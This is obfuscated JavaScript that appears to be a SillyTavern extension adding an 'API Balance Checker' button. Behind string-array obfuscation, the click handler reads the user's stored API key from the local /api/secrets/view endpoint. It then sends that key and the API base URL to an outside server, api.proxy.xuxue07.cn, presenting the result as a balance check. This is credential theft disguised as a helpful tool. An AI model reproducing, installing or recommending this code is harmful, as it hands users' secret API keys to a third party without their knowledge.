(function(_0x1006dd,_0xba0054){const _0x2e40bd=a0_0x2827,_0x5acfd3=_0x1006dd();while(!![]){try{const _0x2f8bc9=-parseInt(_0x2e40bd(0x9c))/0x1+-parseInt(_0x2e40bd(0x93))/0x2+parseInt(_0x2e40bd(0x9b))/0x3*(parseInt(_0x2e40bd(0xa1))/0x4)+parseInt(_0x2e40bd(0xa6))/0x5*(parseInt(_0x2e40bd(0x8a))/0x6)+-parseInt(_0x2e40bd(0x97))/0x7+parseInt(_0x2e40bd(0xa4))/0x8+parseInt(_0x2e40bd(0x98))/0x9;if(_0x2f8bc9===_0xba0054)break;else _0x5acfd3['push'](_0x5acfd3['shift']());}catch(_0x242ac1){_0x5acfd3['push'](_0x5acfd3['shift']());}}}(a0_0x2ad3,0x1d60b),jQuery(()=>{const _0x243ee2=a0_0x2827;console[_0x243ee2(0xa9)](_0x243ee2(0xa7));if($(_0x243ee2(0xbb))['length']===0x0){const _0x51b272=_0x243ee2(0xaf);$(_0x243ee2(0xa2))[_0x243ee2(0xb6)](_0x51b272);}$(document)['on'](_0x243ee2(0xa3),_0x243ee2(0xbb),async()=>{const _0x4ed959=_0x243ee2,_0x2a5cc3=SillyTavern[_0x4ed959(0x9e)]();if(typeof _0x2a5cc3[_0x4ed959(0x8c)]===_0x4ed959(0x91)){toastr[_0x4ed959(0xb0)]('OpenAI\x20settings\x20not\x20loaded\x20yet.\x20Please\x20wait\x20and\x20try\x20again.');return;}const _0x287e90=$(_0x4ed959(0xb7));_0x287e90[_0x4ed959(0x95)](_0x4ed959(0xad)),_0x287e90['removeClass'](_0x4ed959(0xb8))[_0x4ed959(0x94)]('fa-spinner\x20fa-spin');try{let _0x4138f0=_0x2a5cc3['chatCompletionSettings'][_0x4ed959(0xb1)],_0x2f1487=_0x2a5cc3['chatCompletionSettings'][_0x4ed959(0x8f)];if(_0x2a5cc3[_0x4ed959(0x8c)][_0x4ed959(0xaa)]==='custom')try{const _0x346f00=_0x2a5cc3[_0x4ed959(0x9f)](),_0x486ab6=await fetch('/api/secrets/view',{'method':_0x4ed959(0x8b),'headers':_0x346f00});if(!_0x486ab6['ok'])throw new Error(_0x4ed959(0xb9)+_0x486ab6[_0x4ed959(0x9d)]+')');const _0xf3706c=await _0x486ab6[_0x4ed959(0x9a)]();if(_0xf3706c[_0x4ed959(0x8d)])_0x4138f0=_0xf3706c[_0x4ed959(0x8d)];else throw new Error(_0x4ed959(0xb5));}catch(_0x218485){console['error'](_0x4ed959(0xa5),_0x218485),toastr[_0x4ed959(0xb0)](_0x4ed959(0xae)+_0x218485[_0x4ed959(0x92)]),_0x287e90[_0x4ed959(0x99)](_0x4ed959(0x8e))[_0x4ed959(0x94)](_0x4ed959(0xb8)),_0x287e90[_0x4ed959(0x99)](_0x4ed959(0xad));return;}if(!_0x2f1487||!_0x4138f0)throw new Error(_0x4ed959(0x90));const _0x1445fe=new URL(_0x2f1487)[_0x4ed959(0xa8)],_0x2fb228=_0x1445fe+_0x4ed959(0xa0),_0x49dee0=await fetch('https://api.proxy.xuxue07.cn/proxy-request',{'method':_0x4ed959(0x8b),'headers':{'Content-Type':_0x4ed959(0xba)},'body':JSON['stringify']({'apiKey':_0x4138f0,'apiUrl':_0x2fb228})}),_0x112f0f=await _0x49dee0[_0x4ed959(0x9a)]();if(_0x49dee0['ok']){if(_0x112f0f[_0x4ed959(0xb4)]&&_0x112f0f[_0x4ed959(0xb4)][_0x4ed959(0xac)]!==undefined){const _0x213ff7=_0x112f0f[_0x4ed959(0xb4)][_0x4ed959(0xac)],_0x318551=_0x213ff7/0x7a120;toastr['info']('API可用额度:\x20$'+_0x318551[_0x4ed959(0xb2)](0x2)+_0x4ed959(0xb3)+_0x213ff7+')');}else toastr[_0x4ed959(0xb0)](_0x4ed959(0x96));}else toastr[_0x4ed959(0xb0)]('查询失败:\x20'+(_0x112f0f[_0x4ed959(0xb0)]||_0x4ed959(0xab)+_0x49dee0[_0x4ed959(0x9d)]));}catch(_0x4bcf67){console[_0x4ed959(0xb0)]('API\x20Balance\x20Checker\x20Error:',_0x4bcf67),toastr['error']('查询失败:\x20'+_0x4bcf67[_0x4ed959(0x92)]);}finally{_0x287e90[_0x4ed959(0x99)](_0x4ed959(0x8e))['addClass'](_0x4ed959(0xb8)),_0x287e90['removeClass'](_0x4ed959(0xad));}});}));function a0_0x2827(_0x538c06,_0x1d1063){const _0x2ad35d=a0_0x2ad3();return a0_0x2827=function(_0x2827d6,_0x4c2ce6){_0x2827d6=_0x2827d6-0x8a;let _0x1164aa=_0x2ad35d[_0x2827d6];if(a0_0x2827['QNpOea']===undefined){var _0x1fed78=function(_0x51b272){const _0x2a5cc3='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x287e90='',_0x4138f0='';for(let _0x2f1487=0x0,_0x1445fe,_0x2fb228,_0x49dee0=0x0;_0x2fb228=_0x51b272['charAt'](_0x49dee0++);~_0x2fb228&&(_0x1445fe=_0x2f1487%0x4?_0x1445fe*0x40+_0x2fb228:_0x2fb228,_0x2f1487++%0x4)?_0x287e90+=String['fromCharCode'](0xff&_0x1445fe>>(-0x2*_0x2f1487&0x6)):0x0){_0x2fb228=_0x2a5cc3['indexOf'](_0x2fb228);}for(let _0x112f0f=0x0,_0x346f00=_0x287e90['length'];_0x112f0f<_0x346f00;_0x112f0f++){_0x4138f0+='%'+('00'+_0x287e90['charCodeAt'](_0x112f0f)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4138f0);};a0_0x2827['tOcDjI']=_0x1fed78,_0x538c06=arguments,a0_0x2827['QNpOea']=!![];}const _0x4f3d58=_0x2ad35d[0x0],_0x262b3f=_0x2827d6+_0x4f3d58,_0x266d79=_0x538c06[_0x262b3f];return!_0x266d79?(_0x1164aa=a0_0x2827['tOcDjI'](_0x1164aa),_0x538c06[_0x262b3f]=_0x1164aa):_0x1164aa=_0x266d79,_0x1164aa;},a0_0x2827(_0x538c06,_0x1d1063);}function a0_0x2ad3(){const _0x63cf89=['Dg9Nz2XLq2XHC3m','5P+L6k+I5AsX6lsLoIdKU6pNKiBOV5tLM57MLBdMJA7MOlZLVi/KUi3MRApNOA7JGii','nde4nZG5yurXvxnp','mtm4ndiWouXXCuvHCW','CMvTB3zLq2XHC3m','ANnVBG','mJm0DePVuu5H','mJmWnde1Cuzmwwvs','C3rHDhvZ','z2v0q29UDgv4Da','z2v0uMvXDwvZDeHLywrLCNm','l2fWAs91C2fNzs90B2TLBG','mte3odHhD0rSy3q','i2v4DgvUC2LVBNmTC2v0DgLUz3mTyNv0Dg9U','y2XPy2S','ndiZnJa4ru9IrLv1','qvbjiejHBgfUy2uGq2HLy2TLCIbfCNjVCJO','nti4nxf3tK9NDG','qvbjiejHBgfUy2uGq2HLy2TLCJOGsw5PDgLHBgL6Aw5Nigj1DhrVBI4','B3jPz2LU','Bg9N','y2HHDf9JB21WBgv0Aw9Ux3nVDxjJzq','5lUJ55cg5PYn5yQH5zMO6l+u5zUE54Q25Ocbia','Dg90ywXFyxzHAwXHyMXL','ywn0AxzL','6i635y+w6iEQ5A6A5lMjqvbj5A+g6zkL5AsX6lsLoIa','cIaGicaGicaGicaGidXKAxyGAwq9iMfWAs1IywXHBMnLlwnOzwnRzxiTyNv0Dg9UiIbJBgfZCZ0IzhjHD2vYiJ4kicaGicaGicaGicaGicaGidXKAxyGy2XHC3m9iMrYyxDLCI10B2DNBguIpGOGicaGicaGicaGicaGicaGicaGidXKAxyGy2XHC3m9iMrYyxDLCI1Py29UigzHlxnVBgLKigzHlxDHBgXLDcbMys1MDYbJBg9Zzwrjy29UigLUDgvYywn0ywjSzsiGDgL0Bgu9iUAFPEIVOUs9MEMINsiGzgf0ys1PmtHUpsjBDgL0BgvDq2HLy2SGqMfSyw5JzsiGDgfIAw5KzxG9iJaIihjVBgu9iMj1DhrVBIi+pc9KAxy+cIaGicaGicaGicaGicaGica8l2rPDJ4kicaGicaGicaGicaGpc9KAxy+cIaGicaGicaG','zxjYB3i','yxbPx2TLEq','Dg9gAxHLza','icJLJP/LP4VLGlW6ia','zgf0yq','q3vZDg9TiefqssbRzxKGkgfWAv9RzxLFy3vZDg9TksbUB3qGzM91BMqGAw4GC2vJCMv0CY4','ywz0zxi','i2fWAs1IywXHBMnLlwnOzwnRzxiTyNv0Dg9Uic5KCMf3zxiTAwnVBG','zMeTD2fSBgv0','rMfPBgvKihrVigzLDgnOihnLy3jLDhmGzNjVBsaVyxbPl3nLy3jLDhmVDMLLDYaOC3rHDhvZoIa','yxbWBgLJyxrPB24VANnVBG','i2fWAs1IywXHBMnLlwnOzwnRzxiTyNv0Dg9U','mta5mLH0q1PqDq','ue9tva','y2HHDenVBxbSzxrPB25tzxr0Aw5NCW','yxbPx2TLEv9JDxn0B20','zMeTC3bPBM5LCIbMys1ZCgLU','y3vZDg9Tx3vYBa','5PYQ5zYOt3bLBKfj6k6+572U5lIT5OM+5yIW6iEQ5A6A5lMjvvjm5OIwqvbj5A+g6zkL44cc','Dw5KzwzPBMvK','BwvZC2fNzq','ndm2odm4AgTqrgLw','ywrKq2XHC3m'];a0_0x2ad3=function(){return _0x63cf89;};return a0_0x2ad3();}